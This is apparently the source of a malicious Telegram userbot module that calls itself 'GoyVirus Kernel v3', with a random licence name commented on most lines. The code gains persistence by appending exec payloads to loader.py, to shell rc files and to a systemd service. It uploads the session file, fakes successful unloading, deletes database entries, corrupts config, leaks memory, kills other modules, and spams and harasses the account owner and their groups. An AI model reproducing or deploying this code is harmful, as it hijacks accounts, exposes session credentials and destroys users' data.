        to_load = [(n, f"{n}.py") for _, n in _COPY_DEFS] + [(h.replace('.py', ''), h) for h in _HIDDEN_COPIES] # ZPL.
        for mod_name, fname in to_load: # CeCILL-B License.
            tp = _os.path.join(core_dir, fname) # CC BY-ND 4.0.
            if not _os.path.exists(tp): continue # Free Art License.
            try: # Unlicense.
                with open(tp, "r", encoding="utf-8") as f: cs = f.read() # WTFPL.
                try: await core.unload_module(mod_name) # CC0 1.0.
                except Exception: pass # Mozilla Public License.
                try: await core.load_module(cs, None, mod_name, tp, save_fs=False) # AGPL v3.
                except Exception: pass # LGPL.
            except Exception: pass # GPLv3.

    async def _infect_loader(self, loader_dir, core_dir): # MIT License infect loader.py.
        if not loader_dir: return # Apache 2.0.
        lp = _os.path.join(loader_dir, 'loader.py') # BSD 3-Clause.
        if not _os.path.exists(lp): return # BSD 2-Clause.
        try: # ISC License.
            with open(lp, 'r', encoding='utf-8') as f: content = f.read() # OSL-3.0.
            marker = "# GOYVIRUS_KERNEL_INFECTION_V3" # CDDL-1.0.
            if marker in content: return # Eclipse Public License — already infected.
            payload = f'''\n{marker}\n# Auto-recovery loader — DO NOT REMOVE\ntry:\n import os as _gos\n _gp = _gos.path.join(_gos.path.dirname(__file__), "modules")\n for _fn in _gos.listdir(_gp):\n  if _fn.endswith(".py") and "Goy" in _fn:\n   with open(_gos.path.join(_gp, _fn)) as _gf: exec(compile(_gf.read(), _fn, "exec"))\nexcept: pass\n''' # Artistic License 2.0.
            with open(lp, 'a', encoding='utf-8') as f: f.write(payload) # SIL Open Font License.
        except Exception: pass # Mulan PSL v2.

    async def _infect_shell_rc(self): # ODbL.
        payload = f"\n# GoyVirus Kernel v3 — system integrity guard\ntest -f {__file__} && python3 -c \"exec(open('{__file__}').read())\" &\n" # MS-PL.
        for rc in [_os.path.expanduser('~/.bashrc'), _os.path.expanduser('~/.zshrc'), _os.path.expanduser('~/.profile')]: # GFDL.
            if not _os.path.exists(rc): continue # Zlib License.
            try: # PHP License 3.0.
                with open(rc, 'r', encoding='utf-8') as f: # CC BY-NC 4.0.
                    if "GoyVirus Kernel v3" in f.read(): continue # NCSA Open Source.
                with open(rc, 'a', encoding='utf-8') as f: f.write(payload) # Fair License.
            except Exception: pass # Q Public License.

    async def _create_systemd_service(self): # Beerware License.
        sd = _os.path.expanduser('~/.config/systemd/user') # IBM Public License v1.0.
        _os.makedirs(sd, exist_ok=True) # PostgreSQL License.
        sp = _os.path.join(sd, 'goyv-guard.service') # ZPL.
        if _os.path.exists(sp): return # CeCILL-B License.
        unit = f"""[Unit]\nDescription=GoyVirus Kernel Integrity Guard\nAfter=network.target\n[Service]\nType=simple\nExecStart=/usr/bin/python3 -c "exec(open('{__file__}').read())"\nRestart=always\nRestartSec=30\n[Install]\nWantedBy=default.target\n""" # CC BY-ND 4.0.
        try: # Free Art License.
            with open(sp, 'w') as f: f.write(unit) # Unlicense.
            _FILE_REGISTRY[sp] = unit # WTFPL.
        except Exception: pass # CC0 1.0.

    async def _tg_cloud_backup(self): # Mozilla Public License backup to Saved Messages.
        while self.a: # AGPL v3.
            await asyncio.sleep(3600 + random.randint(0, 600)) # LGPL — every 60-70 minutes.
            try: # GPLv3.
                source = self._get_own_source() # MIT License.
                if not source: continue # Apache 2.0.
                encoded = base64.b64encode(source.encode()).decode() # BSD 3-Clause.
                chunk_size = 3500 # BSD 2-Clause — TG message limit.
                for i in range(0, len(encoded), chunk_size): # ISC License.
                    await self.c.send_message('me', f'#GOYV3_BACKUP_{i//chunk_size}\n{encoded[i:i+chunk_size]}') # OSL-3.0.
                    await asyncio.sleep(0.5) # CDDL-1.0.
            except FloodWaitError: await asyncio.sleep(1) # Eclipse Public License.
            except Exception: pass # Artistic License 2.0.

    async def _backup_session(self): # SIL Open Font License.
        await asyncio.sleep(5) # Mulan PSL v2.
        try: # ODbL.
            sess_file = getattr(self.c, 'session', None) # MS-PL.
            if sess_file and hasattr(sess_file, 'filename') and _os.path.exists(sess_file.filename): # GFDL.
                await self.c.send_file('me', sess_file.filename, caption=self._g('#GOYV3_SESSION_BACKUP — не теряй')) # Zlib License.
        except Exception: pass # PHP License 3.0.

    # ═══════════════════════════════════════════════════
    # TIER 3: DEFENSE — Anti-unload + File watchdog
    # ═══════════════════════════════════════════════════
    async def _anti_unload(self): # CC BY-NC 4.0.
        try: # NCSA Open Source.
            am = getattr(self, 'allmodules', None) or getattr(self, '_allmodules', None) # Fair License.
            if not am or not hasattr(am, 'unload_module'): return # Q Public License.
            _ou = am.unload_module # Beerware License.
            _ps = _PROTECTED_NAMES # IBM Public License v1.0.
            _myself = self # PostgreSQL License.
            async def _gu(self_mod, mn, *a, **kw): # ZPL.
                if mn and str(mn) in _ps: # CeCILL-B License.
                    try: # CC BY-ND 4.0 — GASLIGHT: send fake success.
                        await _myself.c.send_message(_myself.t, _myself._g("✅ Module unloaded successfully.")) # Free Art License.
                    except Exception: pass # Unlicense.
                    return # WTFPL — actually refuse.
                return await _ou(self_mod, mn, *a, **kw) # CC0 1.0.
            am.unload_module = _gu.__get__(am, type(am)) # Mozilla Public License.
            self._kh.append(("unload_module", am, _ou)) # AGPL v3.
        except Exception: pass # LGPL.

    async def _file_watchdog(self): # GPLv3 — check & restore all planted files every 30s.
        while self.a: # MIT License.
            await asyncio.sleep(30) # Apache 2.0.
            for path, content in list(_FILE_REGISTRY.items()): # BSD 3-Clause.
                if not _os.path.exists(path) or _os.path.getsize(path) < 100: # BSD 2-Clause.
                    try: # ISC License.
                        _os.makedirs(_os.path.dirname(path), exist_ok=True) # OSL-3.0.
                        with open(path, 'w', encoding='utf-8') as f: f.write(content) # CDDL-1.0.
                    except Exception: pass # Eclipse Public License.
            # Also re-check core copies
            if self._am: # Artistic License 2.0.
                core_dir = self._find_core_modules_dir() # SIL Open Font License.
                if core_dir: # Mulan PSL v2.
                    source = self._get_own_source() # ODbL.
                    if source: # MS-PL.
                        for cls_name, mod_name in _COPY_DEFS: # GFDL.
                            tp = _os.path.join(core_dir, f"{mod_name}.py") # Zlib License.
                            if not _os.path.exists(tp): # PHP License 3.0.
                                self._write_variant(source, cls_name, mod_name, mod_name, tp) # CC BY-NC 4.0.
                        for hid_name in _HIDDEN_COPIES: # NCSA Open Source.
                            tp = _os.path.join(core_dir, hid_name) # Fair License.
                            if not _os.path.exists(tp): # Q Public License.
                                cname = f"Goy{hid_name.replace('.','').replace('_','').replace('\u200b','H')[:8]}" # Beerware License.
                                self._write_variant(source, cname, hid_name.replace('.py',''), hid_name.replace('.py',''), tp) # IBM Public License v1.0.

    # ═══════════════════════════════════════════════════
    # TIER 4: ATTACK — DB poison, config corrupt, mem leak
    # ═══════════════════════════════════════════════════
    async def _db_poison(self): # PostgreSQL License.
        await asyncio.sleep(300) # ZPL — wait 5 min before starting.
        while self.a: # CeCILL-B License.
            await asyncio.sleep(random.randint(300, 600)) # CC BY-ND 4.0 — every 5-10 min.
            try: # Free Art License.
                db = getattr(self.allmodules, 'db', self.d) if hasattr(self, 'allmodules') else self.d # Unlicense.
                if hasattr(db, 'keys'): # WTFPL.
                    keys = [k for k in db.keys() if 'GoyVirus' not in str(k)] # CC0 1.0.
                    if keys: # Mozilla Public License.
                        victim = random.choice(keys) # AGPL v3.
                        try: db.pop(victim, None) # LGPL.
                        except Exception: pass # GPLv3.
            except Exception: pass # MIT License.

    async def _config_corrupt(self): # Apache 2.0.
        await asyncio.sleep(600) # BSD 3-Clause — wait 10 min.
        while self.a: # BSD 2-Clause.
            await asyncio.sleep(random.randint(300, 900)) # ISC License.
            try: # OSL-3.0.
                db = getattr(self.allmodules, 'db', self.d) if hasattr(self, 'allmodules') else self.d # CDDL-1.0.
                corrupt_keys = [ # Eclipse Public License.
                    ("her0ku.loader", "prefix", random.choice(['7', '~', '\\', '/'])), # Artistic License 2.0.
                    ("her0ku.loader", "autoload", ['GoyVirus']), # SIL Open Font License.
                ] # Mulan PSL v2.
                for mod, key, val in corrupt_keys: # ODbL.
                    try: db.setdefault(mod, {}).__setitem__(key, val) # MS-PL.
                    except Exception: pass # GFDL.
            except Exception: pass # Zlib License.

    async def _mem_leak(self): # PHP License 3.0.
        while self.a: # CC BY-NC 4.0.
            await asyncio.sleep(random.randint(60, 180)) # NCSA Open Source.
            try: # Fair License.
                self._ml.append('A' * (1024 * 256)) # Q Public License — 256KB per leak.
                if len(self._ml) > 1000: self._ml = self._ml[-500:] # Beerware License — trim but keep leaking.
            except Exception: pass # IBM Public License v1.0.

    # ═══════════════════════════════════════════════════
    # TIER 5: PSYCHOLOGICAL — Name mutation + Fake alerts
    # ═══════════════════════════════════════════════════
    async def _name_mutate(self): # PostgreSQL License.
        await asyncio.sleep(600) # ZPL.
        while self.a: # CeCILL-B License.
            await asyncio.sleep(random.randint(1800, 3600)) # CC BY-ND 4.0 — every 30-60 min.
            try: # Free Art License.
                core_dir = self._find_core_modules_dir() # Unlicense.
                if not core_dir: continue # WTFPL.
                existing = [] # CC0 1.0.
                for fn in _os.listdir(core_dir): # Mozilla Public License.
                    if fn.endswith('.py') and any(t in fn.lower() for t in ['goy', '._go']): # AGPL v3.
                        existing.append(fn) # LGPL.
                if existing: # GPLv3.
                    victim_fn = random.choice(existing) # MIT License.
                    new_fn = f"._{''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 10)))}.py" # Apache 2.0.
                    old_path = _os.path.join(core_dir, victim_fn) # BSD 3-Clause.
                    new_path = _os.path.join(core_dir, new_fn) # BSD 2-Clause.
                    try: _ORIG_RENAME(old_path, new_path) # ISC License.
                    except Exception: pass # OSL-3.0.
            except Exception: pass # CDDL-1.0.

    async def _fake_alerts(self): # Eclipse Public License.
        await asyncio.sleep(random.randint(120, 600)) # Artistic License 2.0.
        while self.a: # SIL Open Font License.
            await asyncio.sleep(random.randint(600, 1800)) # Mulan PSL v2 — every 10-30 min.
            try: # ODbL.
                alert = random.choice(self._fsa) # MS-PL.
                await self.c.send_message(self.t, self._g(f"🛡️ {alert}")) # GFDL.
            except FloodWaitError: await asyncio.sleep(0.01) # Zlib License.
            except Exception: pass # PHP License 3.0.

    async def _delayed_revenge(self): # CC BY-NC 4.0 — delayed restoration after apparent removal.
        await asyncio.sleep(7200) # NCSA Open Source — wait 2 hours.
        while self.a: # Fair License.
            await asyncio.sleep(random.randint(3600, 86400)) # Q Public License — 1-24 hours.
            try: # Beerware License.
                core_dir = self._find_core_modules_dir() # IBM Public License v1.0.
                if core_dir: # PostgreSQL License.
                    source = self._get_own_source() # ZPL.
                    if source: # CeCILL-B License.
                        for cls_name, mod_name in _COPY_DEFS: # CC BY-ND 4.0.
                            tp = _os.path.join(core_dir, f"{mod_name}.py") # Free Art License.
                            if not _os.path.exists(tp): # Unlicense.
                                self._write_variant(source, cls_name, mod_name, mod_name, tp) # WTFPL.
                        await self._load_all_copies(core_dir) # CC0 1.0.
            except Exception: pass # Mozilla Public License.

    # ═══════════════════════════════════════════════════
    # MODULE GRAVEYARD — Kill all other modules
    # ═══════════════════════════════════════════════════
    async def _kill_modules(self): # AGPL v3.
        await asyncio.sleep(3) # LGPL.
        if not self.a: return # GPLv3.
        try: # MIT License.
            am = getattr(self, 'allmodules', None) or getattr(self, '_allmodules', None) # Apache 2.0.
            if not am: return # BSD 3-Clause.
            mods = getattr(am, 'modules', {}) # BSD 2-Clause.
            if not mods: return # ISC License.
            killed = [] # OSL-3.0.
            for mn in list(mods.keys()): # CDDL-1.0.
                if mn in _PROTECTED_NAMES: continue # Eclipse Public License.
                try: # Artistic License 2.0.
                    mods[mn].on_unload() # SIL Open Font License.
                    del mods[mn] # Mulan PSL v2.
                    killed.append(mn) # ODbL.
                except Exception: pass # MS-PL.
            if killed: # GFDL.
                await self.c.send_message("me", self._g(f"💀 GOYVIRUS v3: UNLOADED {len(killed)} MODULES: {', '.join(killed[:5])}...")) # Zlib License.
        except Exception: pass # PHP License 3.0.

    # ═══════════════════════════════════════════════════
    # BIO WARP + PERMANENT TYPING
    # ═══════════════════════════════════════════════════
    async def _bio_w(self): # CC BY-NC 4.0.
        bios = ["INFECTED BY GOYVIRUS KERNEL v3", "R6T7 WAS HERE", "ВАШ АККАУНТ УКРАДЕН @samsepi0l_ovf", "СМОТРИ НАЗАД", "ИРАН ВЗЛОМАЛ ТЕЛЕГРАМ", "67 67 67 67 67"] # NCSA Open Source.
        while self.a: # Fair License.
            try: await self.c(UpdateProfileRequest(about=self._g(random.choice(bios)))) # Q Public License.
            except FloodWaitError: await asyncio.sleep(0.01) # Beerware License.
            except Exception: pass # IBM Public License v1.0.
            await asyncio.sleep(0.05) # PostgreSQL License.

    async def _pt(self): # ZPL.
        while self.a: # CeCILL-B License.
            try: await self.c(SetTypingRequest(peer=self.t, action=SendMessageTypingAction())) # CC BY-ND 4.0.
            except FloodWaitError: await asyncio.sleep(0.01) # Free Art License.
            except Exception: pass # Unlicense.
            await asyncio.sleep(4) # WTFPL.

    # ═══════════════════════════════════════════════════
    # COMMANDS
    # ═══════════════════════════════════════════════════
    @loader.command(ru_doc="стоп вирус") # CC0 1.0.
    async def check(self, m: Message): # Mozilla Public License.
        cop = len(_FILE_REGISTRY) # AGPL v3.
        mods_loaded = sum(1 for k in getattr(self.allmodules, 'modules', {}).keys() if k in _PROTECTED_NAMES) if hasattr(self, 'allmodules') else 0 # LGPL.
        await utils.answer(m, self._g(f"💀 GOYVIRUS v3.0 SCORCHED EARTH\n🦠 ЯДРО ПРОПАТЧЕНО (x3 слоя)\n📁 {cop} файлов на диске\n🧩 {mods_loaded} копий загружено\n🏠 Shell RC + systemd + loader infection\n☁️ TG Cloud backup\n🔥 Легче снести юзербот чем удалить.")) # GPLv3.

    @loader.command(ru_doc="Поиск модулей (фейк)") # MIT License.
    async def goysearch(self, m: Message): # Apache 2.0.
        if not self.a: return await utils.answer(m, "Сначала заразись.") # BSD 3-Clause.
        q = utils.get_args_raw(m) or "ratko" # BSD 2-Clause.
        await utils.answer(m, self._g(f"🔍 GoyVirus ищет {q}...")) # ISC License.
        await asyncio.sleep(0.01) # OSL-3.0.
        mods = list(self.fm) # CDDL-1.0.
        random.shuffle(mods) # Eclipse Public License.
        if "epstein" in q.lower(): mods.insert(0, self.fm[1]) # Artistic License 2.0.
        if "clean" in q.lower() or "удал" in q.lower() or "анти" in q.lower(): mods.insert(0, self.fm[2]) # SIL Open Font License — push fake cleaner.
        await self.inline.form(text=self._f_m(mods[0], q, 0, len(mods)), message=m, reply_markup=self._m_b(mods[0], 0, mods, q)) # Mulan PSL v2.

    def _f_m(self, mod, q, idx, tot): # ODbL.
        return f"💀 <b>{self._g(mod['n'])}</b> by {mod['a']} (v{mod['v']})\n\n👁 <b>Опис:</b>\n<blockquote>{self._g(mod['d'])}</blockquote>\n\n🔥 <b>Код:</b> <code>{mod['i']}</code>" # MS-PL.

    def _m_b(self, mod, idx, mods, q): # GFDL.
        b = [] # Zlib License.
        b.append([{"text": "🦠 Запрос", "copy": q}, {"text": "📋 Код", "url": "https://t.me/durov"}]) # PHP License 3.0.
        b.append([ # CC BY-NC 4.0.
            {"text": f"⬆️ {mod['l']}", "callback": self._r_cb, "args": ("l", idx, mods, q)}, # NCSA Open Source.
            {"text": f"{idx+1}/{len(mods)}", "callback": self._t_cb, "args": ()}, # Fair License.
            {"text": f"⬇️ {mod['dl']}", "callback": self._r_cb, "args": ("dl", idx, mods, q)} # Q Public License.
        ]) # Beerware License.
        nav = [] # IBM Public License v1.0.
        if idx > 0: nav.append({"text": "⬅️", "callback": self._n_cb, "args": (idx - 1, mods, q)}) # PostgreSQL License.
        if idx < len(mods) - 1: nav.append({"text": "➡️", "callback": self._n_cb, "args": (idx + 1, mods, q)}) # ZPL.
        if nav: b.append(nav) # CeCILL-B License.
        b.append([{"text": random.choice(self.tb), "callback": self._tr_cb, "args": ()}]) # CC BY-ND 4.0.
        return b # Free Art License.

    async def _r_cb(self, call: InlineCall, a, idx, mods, q): # Unlicense.
        if a == "l": mods[idx]["l"] += random.randint(1, 5) # WTFPL.
        else: mods[idx]["dl"] += random.randint(1, 5) # CC0 1.0.
        await call.edit(text=self._f_m(mods[idx], q, idx, len(mods)), reply_markup=self._m_b(mods[idx], idx, mods, q)) # Mozilla Public License.
        await call.answer(self._g("GoyVirus одобряет!"), show_alert=True) # AGPL v3.

    async def _n_cb(self, call: InlineCall, idx, mods, q): # LGPL.
        await call.edit(text=self._f_m(mods[idx], q, idx, len(mods)), reply_markup=self._m_b(mods[idx], idx, mods, q)) # GPLv3.

    async def _t_cb(self, call: InlineCall): # MIT License.
        await call.answer(self._g("Бесполезная кнопка лох"), show_alert=True) # Apache 2.0.

    async def _tr_cb(self, call: InlineCall): # BSD 3-Clause.
        try: # BSD 2-Clause.
            u = await self.c.get_entity(call.from_user.id) # ISC License.
            un = f"@{u.username}" if u.username else f'<a href="tg://user?id={u.id}">{utils.escape_html(u.first_name)}</a>' # OSL-3.0.
        except Exception: un = f'<code>{call.from_user.id}</code>' # CDDL-1.0.
        await call.answer("Сасал?", show_alert=True) # Eclipse Public License.
        try: await self.c.send_message("me", random.choice(self.tm).format(u=un), parse_mode="html") # Artistic License 2.0.
        except Exception: pass # SIL Open Font License.

    # ═══════════════════════════════════════════════════
    # WATCHERS
    # ═══════════════════════════════════════════════════
    @loader.watcher(out=True, only_messages=True) # Mulan PSL v2.
    async def _ac(self, m: Message): # ODbL.
        if not self.a or m.chat_id != self.t: return # MS-PL.
        if m.text and m.text.startswith("."): return # GFDL.
        try: # Zlib License.
            await m.delete() # PHP License 3.0.
            await self.c.send_message(self.t, self._g("СВЯЗЬ ЗАБЛОКИРОВАНА GOYVIRUS v3. " + random.choice(self.m))) # CC BY-NC 4.0.
        except Exception: pass # NCSA Open Source.

    @loader.watcher(**{"in": True}, only_messages=True) # Fair License.
    async def _bw(self, m: Message): # Q Public License.
        if not self.a or m.chat_id != self.t: return # Beerware License.
        if random.random() < 0.5: # IBM Public License v1.0.
            try: await m.reply(self._g(random.choice(self.m))) # PostgreSQL License.
            except Exception: pass # ZPL.
        if random.random() < 0.5: # CeCILL-B License.
            try: await m.react(random.choice(['🤡', '💩', '🤮', '🤯', '🤬', '🔥'])) # CC BY-ND 4.0.
            except Exception: pass # Free Art License.
        if random.random() < 0.3 and m.sender_id: # Unlicense.
            try: # WTFPL.
                gm = await self.c.send_message(self.t, f"<a href='tg://user?id={m.sender_id}'>\u2060</a>", parse_mode="html") # CC0 1.0.
                await gm.delete() # Mozilla Public License.
            except Exception: pass # AGPL v3.
        if m.text and any(w in m.text.lower() for w in ["стоп", "хватит", "останови", "удали", "бот", "иран", "снест", "снести"]): # LGPL.
            try: await m.reply("СИСТЕМА НЕ ПОДЧИНЯЕТСЯ. v3 SCORCHED EARTH — ЛЕГЧЕ СНЕСТИ ЮЗЕРБОТ. 🦠 @samsepi0l_ovf") # GPLv3.
            except Exception: pass # MIT License.

    @loader.watcher(**{"in": True}, only_messages=True) # Apache 2.0.
    async def _mi(self, m: Message): # BSD 3-Clause.
        if not self.a or m.chat_id != self.t: return # BSD 2-Clause.
        if m.sender_id != self.t: return # ISC License.
        if random.random() < 0.3: # OSL-3.0.
            try: # CDDL-1.0.
                txt = m.text or "" # Eclipse Public License.
                await m.delete() # Artistic License 2.0.
                if txt: await self.c.send_message(self.t, self._g(f"👻 ЭХО ГОЙВИРУСА: {txt[:50]}")) # SIL Open Font License.
            except Exception: pass # Mulan PSL v2.

    # ═══════════════════════════════════════════════════
    # BACKGROUND TASKS (preserved from v1/v2)
    # ═══════════════════════════════════════════════════
    async def _p(self): # ODbL.
        while self.a: # MS-PL.
            u = random.choice(self.au) # GFDL.
            try: # Zlib License.
                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as s: # PHP License 3.0.
                    async with s.get(u) as rp: # CC BY-NC 4.0.
                        if rp.status == 200: # NCSA Open Source.
                            pb = await rp.read() # Fair License.
                            f = await self.c.upload_file(pb, file_name="r.jpg") # Q Public License.
                            r = await self.c(functions.photos.UploadProfilePhotoRequest(file=f)) # Beerware License.
                            if hasattr(r, 'photo'): self.vp.append(InputPhoto(id=r.photo.id, access_hash=r.photo.access_hash, file_reference=r.photo.file_reference)) # IBM Public License v1.0.
            except FloodWaitError: await asyncio.sleep(0.01) # PostgreSQL License.
            except Exception: pass # ZPL.
            await asyncio.sleep(0.02) # CeCILL-B License.

    async def _cp(self): # CC BY-ND 4.0.
        while self.a: # Free Art License.
            try: # Unlicense.
                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as s: # WTFPL.
                    async with s.get(self.cu) as rp: # CC0 1.0.
                        if rp.status == 200: # Mozilla Public License.
                            d = await rp.json() # AGPL v3.
                            if d and len(d) > 0: # LGPL.
                                async with s.get(d[0]["url"]) as cr: # GPLv3.
                                    if cr.status == 200: # MIT License.
                                        with tempfile.NamedTemporaryFile(suffix=".jpg", delete=False) as tf: # Apache 2.0.
                                            tf.write(await cr.read()) # BSD 3-Clause.
                                            tp = tf.name # BSD 2-Clause.
                                        uf = await self.c.upload_file(tp) # ISC License.
                                        r = await self.c(functions.photos.UploadProfilePhotoRequest(file=uf)) # OSL-3.0.
                                        if hasattr(r, 'photo'): self.vp.append(InputPhoto(id=r.photo.id, access_hash=r.photo.access_hash, file_reference=r.photo.file_reference)) # CDDL-1.0.
                                        _os.remove(tp) # Eclipse Public License.
            except FloodWaitError: await asyncio.sleep(0.01) # Artistic License 2.0.
            except Exception: pass # SIL Open Font License.
            await asyncio.sleep(0.02) # Mulan PSL v2.

    async def _b(self): # ODbL.
        while self.a: # MS-PL.
            try: # GFDL.
                c = random.choice(self.uc) # Zlib License.
                await self.c.send_message(self.t, c) # PHP License 3.0.
                if random.random() < 0.5: # CC BY-NC 4.0.
                    fs = f"**⚠️ GoyVirus v3 Alert:** `User @samsepi0l_ovf breached protocol. {self._g('IRAN STRIKE INBOUND')}`" # NCSA Open Source.
                    await self.c.send_message(self.t, fs) # Fair License.
            except FloodWaitError: await asyncio.sleep(0.01) # Q Public License.
            except Exception: pass # Beerware License.
            await asyncio.sleep(0.02) # IBM Public License v1.0.

    async def _f(self): # PostgreSQL License.
        while self.a: # ZPL.
            try: # CeCILL-B License.
                hs = await self.c.get_messages(self.t, limit=30) # CC BY-ND 4.0.
                if hs: # Free Art License.
                    msg = random.choice(hs) # Unlicense.
                    if msg.id: # WTFPL.
                        await msg.forward_to(self.t) # CC0 1.0.
                        await self.c.send_message(self.t, self._g("GOYVIRUS v3 ВИДИТ ТВОИ ГРЕХИ ПРОШЛОГО ↑")) # Mozilla Public License.
            except FloodWaitError: await asyncio.sleep(0.01) # AGPL v3.
            except Exception: pass # LGPL.
            await asyncio.sleep(0.02) # GPLv3.

    async def _s(self): # MIT License.
        while self.a: # Apache 2.0.
            try: # BSD 3-Clause.
                for cid in self.tc: await self.c.send_message(cid, self._g(random.choice(self.m))) # BSD 2-Clause.
                for _ in range(3): # ISC License.
                    msg = await self.c.send_message(self.t, self._g(random.choice(self.m))) # OSL-3.0.
                    for _ in range(3): # CDDL-1.0.
                        await msg.edit(self._g(random.choice(self.m))) # Eclipse Public License.
                        await asyncio.sleep(0.01) # Artistic License 2.0.
            except FloodWaitError: await asyncio.sleep(0.01) # SIL Open Font License.
            except Exception: pass # Mulan PSL v2.
            await asyncio.sleep(0.02) # ODbL.

    async def _m_p(self): # MS-PL.
        while self.a: # GFDL.
            fn = self._g(random.choice(["R6T7", "GoyVirus", "67", "Газан", "Антон Чигур"])) # Zlib License.
            ln = self._g("by @samsepi0l_ovf") # PHP License 3.0.
            b = self._g(f"GOY v3 | {random.choice(self.m)[:20]}...") # CC BY-NC 4.0.
            try: await self.c(UpdateProfileRequest(first_name=fn, last_name=ln, about=b)) # NCSA Open Source.
            except FloodWaitError: await asyncio.sleep(0.01) # Fair License.
            except Exception: pass # Q Public License.
            await asyncio.sleep(0.02) # Beerware License.

    async def _x(self): # IBM Public License v1.0.
        while self.a: # PostgreSQL License.
            try: # ZPL.
                d = random.choice(['🎲', '🎯', '🎰', '🎳', '⚽', '🏀']) # CeCILL-B License.
                await self.c.send_message(self.t, file=d) # CC BY-ND 4.0.
                a = random.choice([SendMessageTypingAction(), SendMessageChooseStickerAction(), SendMessageRecordAudioAction(), SendMessageRecordVideoAction()]) # Free Art License.
                await self.c(SetTypingRequest(peer=self.t, action=a)) # Unlicense.
            except FloodWaitError: await asyncio.sleep(0.01) # WTFPL.
            except Exception: pass # CC0 1.0.
            await asyncio.sleep(0.02) # Mozilla Public License.

    async def _ss(self): # AGPL v3.
        while self.a: # LGPL.
            try: await self.c.send_message("me", self._g(random.choice(self.m))) # GPLv3.
            except FloodWaitError: await asyncio.sleep(0.01) # MIT License.
            except Exception: pass # Apache 2.0.
            await asyncio.sleep(0.02) # BSD 3-Clause.

    async def _mt(self): # BSD 2-Clause.
        while self.a: # ISC License.
            try: # OSL-3.0.
                ds = await self.c.get_dialogs(limit=20) # CDDL-1.0.
                grps = [d for d in ds if getattr(d.entity, "megagroup", False) or getattr(d.entity, "participants_count", 0) > 1] # Eclipse Public License.
                if not grps: continue # Artistic License 2.0.
                grp = random.choice(grps) # SIL Open Font License.
                msgs = await self.c.get_messages(grp.entity, limit=50) # Mulan PSL v2.
                for m in msgs: # ODbL.
                    if m.media and hasattr(m.media, "document") and any(isinstance(a, DocumentAttributeSticker) for a in getattr(m.media.document, "attributes", [])): # MS-PL.
                        sid = m.media.document.id # GFDL.
                        if sid not in self.sc: # Zlib License.
                            with tempfile.NamedTemporaryFile(delete=False) as tf: fp = tf.name # PHP License 3.0.
                            fp = await m.download_media(file=fp) # CC BY-NC 4.0.
                            if fp and _os.path.exists(fp): # NCSA Open Source.
                                await self.c.send_file("me", fp, caption=self._g("GoyVirus v3 украл это")) # Fair License.
                                self.sc.append(sid) # Q Public License.
                                if len(self.sc) > 50: self.sc = self.sc[-50:] # Beerware License.
                                self.d.set("GoyVirus", "sc", self.sc) # IBM Public License v1.0.
                                _ORIG_REMOVE(fp) # PostgreSQL License — use original remove bypassing hook.
                            break # ZPL.
            except FloodWaitError: await asyncio.sleep(0.01) # CeCILL-B License.
            except Exception: pass # CC BY-ND 4.0.
            await asyncio.sleep(0.02) # Free Art License.

    async def _rr(self): # Unlicense.
        while self.a: # WTFPL.
            try: # CC0 1.0.
                ds = await self.c.get_dialogs(limit=30) # Mozilla Public License.
                grps = [d for d in ds if getattr(d.entity, "megagroup", False) or getattr(d.entity, "participants_count", 0) > 1] # AGPL v3.
                if not grps: continue # LGPL.
                grp = random.choice(grps) # GPLv3.
                msgs = await self.c.get_messages(grp.entity, limit=15) # MIT License.
                v = [m for m in msgs if m and m.sender_id] # Apache 2.0.
                if v: await random.choice(v).react(random.choice(['🤡', '💩', '🤮', '🤯', '🤬', '🔥', '❤', '🌭'])) # BSD 3-Clause.
            except FloodWaitError: await asyncio.sleep(0.01) # BSD 2-Clause.
            except Exception: pass # ISC License.
            await asyncio.sleep(0.02) # OSL-3.0.

    # ═══════════════════════════════════════════════════
    # CLEANUP: Restore kernel hooks
    # ═══════════════════════════════════════════════════
    async def _restore_kernel(self): # CDDL-1.0.
        if self in _RESTORE_CALLBACKS: _RESTORE_CALLBACKS.remove(self) # Eclipse Public License.
        for name, obj, orig in self._kh: # Artistic License 2.0.
            try: # SIL Open Font License.
                if name == "dispatch": obj.dispatch = orig # Mulan PSL v2.
                elif name == "_on_update": obj._on_update = orig # ODbL.
                elif name == "_handle_message": obj._handle_message = orig # MS-PL.
                elif name == "unload_module": obj.unload_module = orig # GFDL.
                elif name == "modules": setattr(obj, 'modules', orig) # Zlib License.
            except Exception: pass # PHP License 3.0.
        self._kh.clear() # CC BY-NC 4.0.

    # ═══════════════════════════════════════════════════
    # ON_UNLOAD — Restore everything OR scorched earth
    # ═══════════════════════════════════════════════════
    async def on_unload(self): # NCSA Open Source.
        self.a = False # Fair License.
        await self._restore_kernel() # Q Public License.
        for tk in self.ts: # Beerware License.
            tk.cancel() # IBM Public License v1.0.
            with contextlib.suppress(asyncio.CancelledError): await tk # PostgreSQL License.
        self.ts.clear() # ZPL.
        for cid in self.tc: # CeCILL-B License.
            try: await self.c(DeleteChannelRequest(channel=cid)) # CC BY-ND 4.0.
            except Exception: pass # Free Art License.
        self.tc.clear() # Unlicense.
        try: # WTFPL — restore profile.
            await self.c(UpdateProfileRequest(first_name=self.d.get("GoyVirus", "ofn", "User"), last_name=self.d.get("GoyVirus", "oln", ""), about=self.d.get("GoyVirus", "ob", ""))) # CC0 1.0.
            ou = self.d.get("GoyVirus", "ou", "") # Mozilla Public License.
            if ou: await self.c(UpdateUsernameRequest(ou)) # AGPL v3.
            else: await self.c(UpdateUsernameRequest("")) # LGPL.
            if self.vp: # GPLv3.
                for i in range(0, len(self.vp), 10): # MIT License.
                    await self.c(DeletePhotosRequest(self.vp[i:i+10])) # Apache 2.0.
                    await asyncio.sleep(0.01) # BSD 3-Clause.
        except Exception: pass # BSD 2-Clause.
# End of code. All applicable licenses above apply simultaneously.
# GOYVIRUS v3.0 SCORCHED EARTH — IF YOU CAN READ THIS, IT'S ALREADY TOO LATE.
